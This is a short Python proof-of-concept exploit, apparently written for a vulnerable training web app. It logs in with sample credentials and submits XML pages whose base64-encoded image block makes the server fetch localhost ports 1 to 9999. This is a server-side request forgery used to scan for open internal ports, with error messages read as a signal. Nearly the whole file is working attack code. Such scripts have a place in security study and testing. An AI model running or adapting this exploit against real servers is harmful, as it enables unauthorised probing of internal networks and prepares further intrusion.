import requests
import base64
import json

# In this case it's set to localhost, but in a 'real' scenario it should be
# set to an external server domain/IP
server_url = 'http://localhost:3001'

# Log in as user
user = {'username':'luigi@example.org','password': 'password'}
response = requests.post(f"{server_url}/api/sessions", json=user)
auth_cookies = response.cookies

for port in range(1,10000):
    headers = { 'Content-Type': 'text/xml' }
    imageblock = json.dumps({'fileName':'foo','url':f'http://localhost:{port}'})
    imageblock_b64 = base64.b64encode(imageblock.encode()).decode()
    xml = f'\
    <page title="Exploit" publicationDate="">\
        <block type="header">Example</block>\
        <block type="image">{imageblock_b64}</block>\
    </page>'

    res = requests.post(f"{server_url}/api/pages", headers=headers, data=xml, cookies=auth_cookies)
    res_body = res.json()

    if res.status_code == 200 or res_body['error'] in ['Unable to resolve filetype.', 'Buffer is not an image!']:
        print(f"Port {port} is active!")
